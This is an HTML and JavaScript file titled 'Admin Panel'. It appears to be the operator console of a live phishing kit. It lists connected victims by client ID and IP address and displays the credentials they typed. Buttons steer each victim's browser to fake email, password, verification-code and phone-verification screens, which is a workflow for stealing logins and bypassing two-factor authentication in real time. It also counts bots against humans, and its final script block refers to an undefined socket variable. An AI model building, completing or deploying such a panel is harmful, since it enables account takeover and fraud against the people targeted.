<!DOCTYPE html>
<html>
<head>
  <title>Admin Panel</title>
  <style>
    body.light-mode {
      background-color: #f0f0f0;
      color: #000;
      font-family: Arial, sans-serif;
    }

    body.evil-mode {
      background-color: #121212;
      color: #ff5555;
      font-family: 'Courier New', Courier, monospace;
    }

    .client {
      border: 1px solid;
      padding: 10px;
      margin: 10px 0;
    }

    .client.light-mode {
      border-color: #ccc;
      background-color: #fff;
    }

    .client.evil-mode {
      border-color: #ff5555;
      background-color: #1a1a1a;
    }

    .inputs {
      display: none;
      margin-top: 10px;
    }

    .container {
      display: flex;
      align-items: center;
      border: 1px solid;
      border-radius: 2px;
      justify-content: space-between;
      padding: 5px;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis;
      margin-left: 20px;
    }

    .container.light-mode {
      border-color: #ccc;
      background-color: #fff;
    }

    .container.evil-mode {
      border-color: #ff5555;
      background-color: #1a1a1a;
    }

    .circle {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      margin-right: 5px;
      position: absolute;
      background-color: green;
    }

    .circle.light-mode {
      background-color: green;
    }

    .circle.evil-mode {
      background-color: #ff5555;
    }

    .currPage {
      margin-left: 12px;
    }

    .timer-container {
      padding: 2px 0px;
      border-radius: 10px;
      text-align: center;
      font-size: 0.8em;
      width: 15%;
      height: 2%;
      position: fixed;
      left: 3px;
    }

    .timer-container.light-mode {
      background: #ccc;
      color: #000;
      border: 1px solid #ccc;
    }

    .timer-container.evil-mode {
      background: #1a1a1a;
      color: #ff5555;
      border: 1px solid #ff5555;
    }

    .head {
      display: flex;
      flex-direction: row;
      text-align: center;
      justify-content: center;
    }

    h1 {
      font-size: 20px;
    }

    h1.light-mode {
      color: #000;
    }

    h1.evil-mode {
      color: #ff5555;
    }

    .visits {
      padding: 2px 0px;
      border-radius: 10px;
      text-align: center;
      font-size: 1.3em;
      width: 15%;
      height: 2.6%;
      position: fixed;
      right: 4px;
    }

    .visits.light-mode {
      background-color: #ccc;
      color: #000;
      border: 1px solid #ccc;
    }
    
    .numbers.light-mode {
      font-size: 1.6em;
    }
    
    .visits.evil-mode {
      background-color: #1a1a1a;
      color: #ff5555;
      border: 1px solid #ff5555;
      width: 18%;
    }

    .visits div {
      font-size: 0.5em;
      padding-left: 10px;
      justify-content: space-around;
      display: flex;
    }

    .mode-switch {
      position: fixed;
      top: 22px; 
      right: 20%;    
      padding: 5px 10px;
      cursor: pointer;
      border: none;
      background-color: #555;
      color: #fff;
      border-radius: 5px;
    }

    @media (max-width: 768px) {
      .head {
        flex-direction: column;
      }

      .timer-container, .visits {
        width: 90%;
        position: static;
        margin: 10px 0;
      }

      .mode-switch {
        width: 90%;
        margin: 10px auto;
      }

      h1 {
        font-size: 18px;
      }
    }

    @media (max-width: 480px) {
      h1 {
        font-size: 16px;
      }

      .visits {
        font-size: 1em;
      }

      .timer-container {
        font-size: 0.7em;
      }
    }
  </style>
</head>
<body class="evil-mode">
  <div class="head">
    <div class="timer-container evil-mode">
      <span style="font-size: 15px;">Refresh timer</span>
      <div class="timer">03:00</div>
    </div>
    <h1 class="evil-mode">Admin Panel</h1>
    <div class="visits evil-mode">
      <span id="visitors">0</span> |
      <span id="bots">0</span> |
      <span id="humans">0</span>
      <div class="numbers">
        <span>visitor&nbsp;</span>
        <span style="margin: 0 10px;">bots&nbsp;</span>
        <span>visits&nbsp;</span>
      </div>
    </div>
  </div>
  <div id="clients"></div>

  <button class="mode-switch" onclick="toggleMode()">Switch Mode</button>

  <script>
    const clientsDiv = document.getElementById('clients');

    function updateCurrPage(clientId, currPage) {
        const thisNameElements = document.querySelectorAll('.thisName');

        thisNameElements.forEach(div => {
            if (div.id === clientId) {
                console.log("curpage: " + currPage);
                div.parentElement.children[2].children[1].textContent = currPage;
                if (currPage.toLowerCase() === "disconnected") {
                    document.getElementById(`currPage-${clientId}`).previousElementSibling.style.color = "red";
                }
            }
        });
    }

    function updateCount(visitor, bots, humans) {
        document.getElementById("visitors").textContent = visitor.toString();
        document.getElementById("bots").textContent = bots.toString();
        document.getElementById("humans").textContent = humans.toString();
    }

    function updateClients(data) {
    data.clientList.sort((a, b) => b.timestamp - a.timestamp);

    const clientsDiv = document.getElementById('clients');
    clientsDiv.innerHTML = '';

    data.clientList.forEach(client => {
        const clientDiv = document.createElement('div');
        clientDiv.classList.add('client');
        clientDiv.setAttribute('id', `client-${client.clientId}`);

        const inputsHtml = Object.entries(client.inputs).map(([key, value]) => `<p>${key}: ${value}</p>`).join('');
        clientDiv.innerHTML = `
            <div style="display:flex; align-items:center;">
                <div class="thisName" id="${client.clientId}"></div>
                <h3 style="margin-right: 10px;">Client: ${client.clientId} IP: ${client.ip}</h3>
                <div class="container">
                    <div class="circle"></div>
                    <div id="currPage-${client.clientId}" class="currPage"></div>
                </div>
            </div>
            <button onclick="sendCommand('${client.clientId}', 'emailScreen')">Email Screen</button>
            <button onclick="sendCommand('${client.clientId}', 'passwordScreen')">Password Screen</button>
            <button onclick="sendCommand('${client.clientId}', 'loadScreen')">Load Screen</button>
            <button onclick="sendCommand('${client.clientId}', 'codePage')">Code Page</button>
            <button onclick="sendCommand('${client.clientId}', 'verifyPhone')">Verify Page</button>
            <button onclick="sendCommand('${client.clientId}', 'loadPage')">Load Page</button>
            <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
            <button onclick="deleteClient('${client.clientId}')">Delete</button>
            <div id="inputs-${client.clientId}" class="inputs">
                <h4>Inputs:</h4>
                ${inputsHtml}
            </div>
        `;

        clientsDiv.prepend(clientDiv);

        // Update currPage and circle color
        updateCurrPage(client.clientId, data.currPage.currPage, client.isConnected);

        // Schedule removal of disconnected clients after 30 seconds
        if (!client.isConnected) {
            setTimeout(() => {
                const clientToRemove = document.getElementById(`client-${client.clientId}`);
                if (clientToRemove) {
                    clientToRemove.remove();
                }
            }, 30000); // 30 seconds
        }
    });
}

    async function sendCommand(clientId, command) {
        console.log('Sending command:', command, 'to clientId:', clientId);
        try {
            const response = await fetch('/send-command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ clientId, command })
            });
            if (!response.ok) {
                alert('Failed to send command');
            }
        } catch (error) {
            console.error('Error sending command:', error);
            alert('Error sending command');
        }
    }

    function viewInputs(clientId) {
        const inputsDiv = document.getElementById(`inputs-${clientId}`);
        inputsDiv.style.display = inputsDiv.style.display === 'none' ? 'block' : 'none';
    }

    async function deleteClient(clientId) {
        try {
            const response = await fetch('/delete-client', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ clientId })
            });
            if (!response.ok) {
                alert('Failed to delete client');
            }
        } catch (error) {
            console.error('Error deleting client:', error);
            alert('Error deleting client');
        }
    }

    const ws = new WebSocket(`wss://${window.location.host}/?admin=true`);
    
    ws.onmessage = function(event) {
        const data = JSON.parse(event.data);
        if (data.type === 'adminUpdate') {
            console.log(data);
            updateClients(data);
            updateCount(data.stats.visitors, data.stats.bots, data.stats.humans);
        }
    };

    ws.onerror = function(error) {
        console.error('WebSocket error:', error);
    };

    function startTimer(duration, display) {
        let timer = duration, minutes, seconds;
        setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);

            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            display.textContent = minutes + ":" + seconds;

            if (--timer < 0) {
                location.reload();
            }
        }, 1000);
    }

    window.onload = function () {
        let threeMinutes = 60 * 3,
            display = document.querySelector('.timer');
        startTimer(threeMinutes, display);
    };
    
    // Assuming you have a function to manage client status updates
function updateClientStatus(clientId, connected) {
  const clientElement = document.getElementById(clientId);
  if (clientElement) {
    const statusText = connected ? 'Connected' : 'Disconnected';
    const circleClass = connected ? 'circle-green' : 'circle-red';

    clientElement.querySelector('.status').textContent = statusText;
    clientElement.querySelector('.circle').classList.remove('circle-green', 'circle-red');
    clientElement.querySelector('.circle').classList.add(circleClass);
  }
}

// Handle WebSocket events for client connection status
socket.onopen = () => {
  console.log('WebSocket connection opened');
};

socket.onmessage = event => {
  const data = JSON.parse(event.data);
  console.log('WebSocket message received:', data);

  // Example: Update client status based on server message
  if (data.type === 'clientStatusUpdate') {
    updateClientStatus(data.clientId, data.connected);
  }
};

socket.onclose = event => {

};

socket.onerror = error => {
  console.error('WebSocket error:', error);
};
</script>
</body>
</html>
